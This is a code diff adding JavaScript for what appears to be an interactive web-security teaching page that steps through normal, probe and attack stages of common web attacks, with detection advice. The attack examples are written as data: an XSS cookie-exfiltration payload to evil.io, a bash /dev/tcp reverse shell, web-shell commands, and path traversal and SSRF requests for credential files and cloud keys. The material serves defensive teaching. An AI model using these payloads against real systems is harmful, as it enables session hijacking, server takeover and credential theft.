+        res: '200 OK — page renders:\n&lt;p&gt;Great product!&lt;/p&gt;',
+        v: 'Normal', vi: 'text in, text out',
+        cap: '<b>The comment is displayed as words.</b> The browser shows the characters; it does not act on them.'
+      },
+      probe: {
+        req: 'POST /comment\n\ncomment=&lt;b&gt;test&lt;/b&gt;',
+        res: '200 OK — page renders:\n<b>test</b>   (bold, not literal)',
+        v: 'Discovery', vi: 'markup was parsed',
+        cap: '<b>That is the whole test.</b> If <span class="k">&lt;b&gt;</span> comes back as <b>bold</b> rather than as characters, the input is being parsed as HTML — which means a <span class="k">&lt;script&gt;</span> tag will run too.'
+      },
+      attack: {
+        req: 'POST /comment\n\ncomment=&lt;script&gt;fetch("//evil.io?c="\n        +document.cookie)&lt;/script&gt;',
+        res: 'Stored. Fires for every visitor.\nVictim browser → evil.io (session token)',
+        v: 'Session stolen', vi: 'executes on the victim, not you',
+        cap: '<b>The token is the identity</b> — steal it and you are that user, with no password and no login event. <b>And notice where this ran:</b> in a browser you do not own or log. Your access log shows only a normal <span class="k">POST /comment 200</span>.'
+      }
+    },
+
+    /* ---------------- 05 Web shell ---------------- */
+    shell: {
+      title: 'File Upload → Web Shell',
+      normal: {
+        req: 'POST /upload_form.php\nContent-Type: image/jpeg\nfilename="avatar.jpg"',
+        res: '200 OK\nGET /uploads/avatar.jpg → 200 (image served)',
+        v: 'Normal', vi: 'the file is read, not run',
+        cap: '<b>Upload, then serve.</b> The web server reads the bytes and returns them. It never executes an image.'
+      },
+      probe: {
+        req: 'POST /upload_form.php\nContent-Type: image/jpeg   ← spoofed\nfilename="test.php"',
+        res: '200 OK — upload accepted\nGET /uploads/test.php → executes',
+        v: 'Discovery', vi: 'two conditions both true',
+        cap: '<b>The attacker needs both:</b> validation weak enough to accept a script, <i>and</i> an upload directory that permits execution. Testing that harmless file answers both questions at once. <b>Fix either one and the attack dies.</b>'
+      },
+      attack: {
+        req: 'POST /upload_form.php  → webshell.php\nGET /uploads/webshell.php?cmd=whoami\nGET /uploads/webshell.php?cmd=ls\nUser-Agent: curl/7.81.0',
+        res: '200 OK  www-data\n200 OK  customerinfo.pdf  q1financials.pdf',
+        v: 'Server compromised', vi: 'a terminal in a browser tab',
+        cap: '<b>The canonical signature: POST → then repeated GETs to a script in an upload folder.</b> Each GET is one command. Normal users never request <span class="k">.php</span> files from <span class="k">/uploads/</span> — that directory should only ever serve images.'
+      }
+    },
+
+    /* ---------------- 06 Command injection ---------------- */
+    cmdi: {
+      title: 'OS Command Injection',
+      normal: {
+        req: 'POST /diagnostics\n\nhost=192.168.1.1',
+        res: '200 OK\n\nPING 192.168.1.1: 4 packets, 0% loss',
+        v: 'Normal', vi: 'app runs: ping -c 4 192.168.1.1',
+        cap: '<b>The feature legitimately shells out.</b> The app was <i>built</i> to run a system command — that permission already exists.'
+      },
+      probe: {
+        req: 'POST /diagnostics\n\nhost=192.168.1.1; whoami',
+        res: '200 OK\n\nPING … 0% loss\nwww-data          ← second command ran',
+        v: 'Discovery', vi: 'the semicolon chained a command',
+        cap: '<b>Two outputs means two commands ran.</b> The shell interprets <span class="k">;</span> as “next command” whether a developer or an attacker typed it. If the page shows nothing, they test blind with <span class="k">sleep 10</span> and time the response.'
+      },
+      attack: {
+        req: 'host=127.0.0.1; bash -i &gt;&amp; /dev/tcp/45.9.x.x/9999 0&gt;&amp;1',
+        res: 'No useful HTTP response —\nbut the server dials OUT to 45.9.x.x:9999',
+        v: 'Reverse shell', vi: 'no file written to disk',
+        cap: '<b>Nothing to find on the filesystem.</b> Unlike a web shell there is no artefact — so file hunting fails. The detection is <b>process telemetry</b> (web server spawning <span class="k">sh</span>) and <b>egress</b> (a server that suddenly dials out).'
+      }
+    },
+
+    /* ---------------- 07 Path traversal ---------------- */
+    trav: {
+      title: 'Path Traversal',
+      normal: {
+        req: 'GET /download?file=report.pdf',
+        res: '200 OK\nContent-Length: 48210\n(serves /var/www/files/report.pdf)',
+        v: 'Normal', vi: 'base dir + filename',
+        cap: '<b>The app joins your filename onto a fixed folder.</b> Users only ever see the names the interface links to.'
+      },
+      probe: {
+        req: 'GET /download?file=../../../../etc/passwd',
+        res: '200 OK\n\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:…',
+        v: 'Discovery', vi: '../ means “go up one”',
+        cap: '<b>A clean yes/no test.</b> <span class="k">/etc/passwd</span> is world-readable, so getting it back proves the flaw without touching anything sensitive. If filtered, they retry encoded: <span class="k">%2e%2e%2f</span>.'
+      },
+      attack: {
+        req: 'GET /download?file=../../../../var/www/.env',
+        res: '200 OK\n\nDB_PASSWORD=…\nAWS_SECRET_ACCESS_KEY=…',
+        v: 'Credentials stolen', vi: 'config, not /etc/passwd',
+        cap: '<b>The real prize is config files.</b> This is now a credential breach, not a file-read bug. <b>Best signal-to-noise rule in the session:</b> alert on <span class="k">../</span> in any URI — legitimate traffic never contains it, and the 200s tell you exactly which files were taken.'
+      }
+    },
+
+    /* ---------------- 08 IDOR ---------------- */
+    idor: {
+      title: 'IDOR',
+      normal: {
+        req: 'GET /invoice?id=1043\nCookie: session=<i>valid</i>',
+        res: '200 OK\n\nInvoice 1043 — your own',
+        v: 'Normal', vi: 'authenticated, and it is yours',
+        cap: '<b>Looks like a control is working.</b> It is not — the app is simply not showing you links to other invoices.'
+      },
+      probe: {
+        req: 'GET /invoice?id=1042\nCookie: session=<i>same valid session</i>',
+        res: '200 OK\n\nInvoice 1042 — someone else’s',
+        v: 'Discovery', vi: 'one number changed',
+        cap: '<b>That is the entire discovery process.</b> Expected <span class="k">403 Forbidden</span>; got <span class="k">200 OK</span>. The app <i>authenticated</i> you but never asked whether this record is yours.'
+      },
+      attack: {
+        req: 'GET /invoice?id=1000 … 1999\n(scripted loop, one session)',
+        res: '200 OK × 1000\n1,000 customers’ invoices saved',
+        v: 'Mass disclosure', vi: 'every request perfectly legal',
+        cap: '<b>No payload, no error, no anomalous status code — a WAF will never see this.</b> The only signal is behavioural: one session touching an abnormal number of <i>distinct object IDs</i>. Count <span class="k">dc(id) by session</span> and alert on outliers.'
+      }
+    },
+
+    /* ---------------- 09 SSRF ---------------- */
+    ssrf: {
+      title: 'Server-Side Request Forgery',
+      normal: {
+        req: 'POST /preview\n\nurl=https://example.com/logo.png',
+        res: '200 OK\nserver fetched the image, returns preview',
+        v: 'Normal', vi: 'the server fetches on your behalf',
+        cap: '<b>A legitimate feature.</b> Link previews, webhook testers, “import from URL”, PDF renderers — they all need to fetch a URL you supply.'
+      },
+      probe: {
+        req: 'POST /preview\n\nurl=http://attacker-controlled.io/ping',
+        res: '(app shows nothing useful)\n…but attacker’s log: hit from YOUR server IP',
+        v: 'Discovery', vi: 'blind SSRF confirmed',
+        cap: '<b>Confirmed without seeing a thing.</b> The attacker watches their own logs — a connection arriving <i>from your server</i> proves the parameter is live. This is the common case, and it is why the app’s response tells you nothing.'
+      },
+      attack: {
+        req: 'POST /preview\n\nurl=http://169.254.169.254/latest/meta-data/\n    iam/security-credentials/',
+        res: '200 OK\n\nAccessKeyId, SecretAccessKey, Token',
+        v: 'Cloud creds stolen', vi: 'attacker never crossed the firewall',
+        cap: '<b>Your server did it for them, and it is trusted inside.</b> This is no longer a web incident — it is a <b>cloud account compromise</b>. Detection lives in <b>egress and DNS logs</b>, never in the access log: a web server should receive connections, not initiate novel ones.'
+      }
+    },
+
+    /* ---------------- 10 DoS / DDoS ---------------- */
+    dos: {
+      title: 'Denial of Service (Layer 7)',
+      normal: {
+        req: 'GET /index.html   192.168.1.10\nGET /products.html 192.168.1.15\nGET /contact.html  192.168.1.20',
+        res: '200 OK  (4523 bytes)\n200 OK  (6112 bytes)\n200 OK  (2987 bytes)',
+        v: 'Normal', vi: 'many IPs, many pages, real browsers',
+        cap: '<b>Traffic has a rhythm.</b> Spread across pages and sources, diverse User-Agents, stable response times. Learn the shape of your own baseline — the spike only means something against it.'
+      },
+      probe: {
+        req: 'GET /            → 12 ms\nGET /search?q=a  → 340 ms\nGET /login.php   → 890 ms',
+        res: 'attacker notes the most expensive endpoint',
+        v: 'Discovery', vi: 'find what costs the server most',
+        cap: '<b>They shop for the heaviest page.</b> <span class="k">/login</span> hashes a password and hits the database on every request; <span class="k">/search</span> runs complex queries. One request costs them nothing and costs you a lot — that asymmetry <i>is</i> the attack.'
+      },
+      attack: {
+        req: 'GET /login.php  ×1000/min\nsource: 203.0.113.55\nUser-Agent: curl/7.68.0',
+        res: '503 Service Unavailable\n503 Service Unavailable  ← real customers now',
+        v: 'Availability gone', vi: 'the 503s are your users',
+        cap: '<b>Three beats: normal → flood → 503 wall.</b> No software flaw needed, only missing rate limits and capacity. <b>And always ask why:</b> a loud outage is sometimes cover — check authentication, data access and egress logs from the same window.'
+      }
+    }
+  };
+
+  /* ---- per-attack flow map: the four nodes, which one is weak, and the payoff ---- */
+  var MAP = {
+    recon: { nodes:['Attacker','Web server','Content on disk','Hidden paths'], vuln:2,
+             vlabel:'nothing hidden is truly hidden', win:'Map of the app' },
+    brute: { nodes:['Attacker','Web server','Login logic','User accounts'], vuln:2,
+             vlabel:'no rate limit · no lockout', win:'Valid session' },
+    sqli:  { nodes:['Attacker','Web server','Application','Database'], vuln:2,
+             vlabel:'query built by string concatenation', win:'Users table' },
+    xss:   { nodes:['Attacker','Web server','Application','Victim browser'], vuln:2,
+             vlabel:'output never encoded', win:'Session token' },
+    shell: { nodes:['Attacker','Web server','Upload handler','OS / filesystem'], vuln:2,
+             vlabel:'no validation + dir executes', win:'Remote shell' },
+    cmdi:  { nodes:['Attacker','Web server','Application','OS shell'], vuln:2,
+             vlabel:'input concatenated into a command', win:'Code execution' },
+    trav:  { nodes:['Attacker','Web server','File handler','Filesystem'], vuln:2,
+             vlabel:'path never canonicalised', win:'Config + secrets' },
+    idor:  { nodes:['Attacker','Web server','Authorisation','Database'], vuln:2,
+             vlabel:'“is this record yours?” never asked', win:'Everyone’s records' },
+    ssrf:  { nodes:['Attacker','Web server','URL fetcher','Internal network'], vuln:2,
+             vlabel:'any destination accepted', win:'Cloud credentials' },
+    dos:   { nodes:['Botnet','Edge / WAF','Web server','Capacity'], vuln:1,
+             vlabel:'no rate limiting', win:'Service down' }
+  };
+
+  var C = {
+    normal: { line:'#3fa87a', node:'#132244', edge:'#2a3c68', txt:'#e8edf7', sub:'#8ea3c9' },
+    probe:  { line:'#f0c860', node:'#2a2414', edge:'#6a5a2a', txt:'#ffe9b0', sub:'#c9b98a' },
+    attack: { line:'#e0556b', node:'#2a1622', edge:'#6a2a3a', txt:'#ff9db0', sub:'#c58ea0' }
+  };
+
+  /* Build the flow SVG for one attack in one state. */
+  function viz(key, state) {
+    var m = MAP[key], c = C[state], i;
+    var X = [14, 246, 478, 710], W = 216, Y = 34, H = 54;
+    var reach = state === 'normal' ? 3 : (state === 'probe' ? m.vuln : 3);
+    var s = '<svg viewBox="0 0 940 168" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="'
+          + m.nodes.join(' then ') + ' — ' + state + ' flow">';
+    s += '<defs><marker id="mk' + key + state + '" markerWidth="9" markerHeight="9" refX="7" refY="3" '
+       + 'orient="auto" markerUnits="strokeWidth"><path d="M0,0 L7,3 L0,6 Z" fill="' + c.line + '"/></marker></defs>';
+
+    for (i = 0; i < 4; i++) {
+      var isVuln = (i === m.vuln), lit = (i <= reach);
+      var nf = isVuln && state !== 'normal' ? '#26183a' : (lit ? c.node : '#0e1730');
+      var ne = isVuln && state !== 'normal' ? '#8a5cff' : (lit ? c.edge : '#1a2740');
+      var nt = lit ? c.txt : '#5a6b8c';
+      s += '<rect x="' + X[i] + '" y="' + Y + '" width="' + W + '" height="' + H + '" rx="10" fill="'
+         + nf + '" stroke="' + ne + '" stroke-width="' + (isVuln && state !== 'normal' ? 2 : 1) + '"/>';
+      s += '<text x="' + (X[i] + W / 2) + '" y="' + (Y + 33) + '" text-anchor="middle" fill="' + nt
+         + '" font-family="sans-serif" font-size="13.5" font-weight="700">' + m.nodes[i] + '</text>';
+      if (isVuln && state !== 'normal') {
+        s += '<text x="' + (X[i] + W / 2) + '" y="' + (Y + H + 20) + '" text-anchor="middle" fill="#c8b3ff" '
+           + 'font-family="sans-serif" font-size="11.5">' + m.vlabel + '</text>';
+        s += '<text x="' + (X[i] + W / 2) + '" y="' + (Y - 10) + '" text-anchor="middle" fill="#b79cff" '
+           + 'font-family="sans-serif" font-size="11.5" font-weight="700">the weakness</text>';
+      }
+    }
+    for (i = 0; i < 3; i++) {
+      var on = (i < reach);
+      s += '<path d="M' + (X[i] + W) + ' ' + (Y + H / 2) + ' H' + (X[i + 1] - 4) + '" stroke="'
+         + (on ? c.line : '#22304e') + '" stroke-width="' + (on ? 2.4 : 1.4) + '" fill="none"'
+         + (on ? ' marker-end="url(#mk' + key + state + ')"' : ' stroke-dasharray="5 4"') + '/>';
+    }
+    /* return path / outcome strip */
+    if (state === 'normal') {
+      s += '<path d="M' + (X[3] + W / 2) + ' ' + (Y + H) + ' V128 H' + (X[0] + W / 2) + ' V' + (Y + H)
+         + '" stroke="#3fa87a" stroke-width="1.8" fill="none" stroke-dasharray="6 4"/>';
+      s += '<text x="470" y="150" text-anchor="middle" fill="#7fe0a0" font-family="sans-serif" '
+         + 'font-size="12">normal response returns to the user</text>';
+    } else if (state === 'probe') {
+      s += '<text x="470" y="146" text-anchor="middle" fill="#ffd98a" font-family="sans-serif" '
+         + 'font-size="12">the probe stops here — the response reveals the weakness</text>';
+    } else {
+      s += '<path d="M' + (X[3] + W / 2) + ' ' + (Y + H) + ' V128 H' + (X[0] + W / 2) + ' V' + (Y + H)
+         + '" stroke="#e0556b" stroke-width="2" fill="none"/>';
+      s += '<rect x="352" y="112" width="236" height="30" rx="8" fill="#3a1414" stroke="#5a2020"/>';
+      s += '<text x="470" y="132" text-anchor="middle" fill="#ffc9c0" font-family="sans-serif" '
+         + 'font-size="12.5" font-weight="700">' + m.win + ' → attacker</text>';
+    }
+    return s + '</svg>';
+  }
+
+  var ORDER = ['normal', 'probe', 'attack'];
+  var CLS = { normal: 'is-normal', probe: 'is-probe', attack: 'is-attack' };
+
+  function render(root, key, state) {
+    var d = A[key]; if (!d || !d[state]) return;
+    var s = d[state];
+    ORDER.forEach(function (o) { root.classList.remove(CLS[o]); });
+    root.classList.add(CLS[state]);
+    var v = root.querySelector('[data-slot="viz"]');
+    if (v && MAP[key]) v.innerHTML = viz(key, state);
+    root.querySelector('[data-slot="req"]').innerHTML = s.req;
+    root.querySelector('[data-slot="res"]').innerHTML = s.res;
+    root.querySelector('[data-slot="v"]').innerHTML = s.v;
+    root.querySelector('[data-slot="vi"]').innerHTML = s.vi;
+    root.querySelector('[data-slot="cap"]').innerHTML = s.cap;
+    root.querySelectorAll('[data-st]').forEach(function (b) {
+      b.classList.toggle('on', b.getAttribute('data-st') === state);
+    });
+  }
+
+  document.querySelectorAll('.sim[data-atk]').forEach(function (root) {
+    var key = root.getAttribute('data-atk');
+    if (!A[key]) return;
+    root.querySelectorAll('[data-st]').forEach(function (b) {
+      b.addEventListener('click', function () { render(root, key, b.getAttribute('data-st')); });
+    });
+    render(root, key, 'normal');
+  });
+})();
+</script>
 <script src="../assets/js/session.js"></script>
 <script src="../assets/js/homework.js"></script>
 <script src="../assets/js/quiz.js"></script>
